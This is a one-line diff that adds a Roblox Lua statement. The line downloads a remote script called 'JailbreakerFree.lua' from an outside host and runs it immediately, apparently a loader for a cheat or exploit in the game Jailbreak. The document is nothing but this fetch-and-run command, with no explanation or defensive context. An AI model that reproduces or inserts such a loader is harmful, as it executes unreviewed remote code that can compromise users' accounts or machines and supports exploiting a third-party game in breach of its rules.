@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://scripts.luawl.com/14245/JailbreakerFree.lua'))()
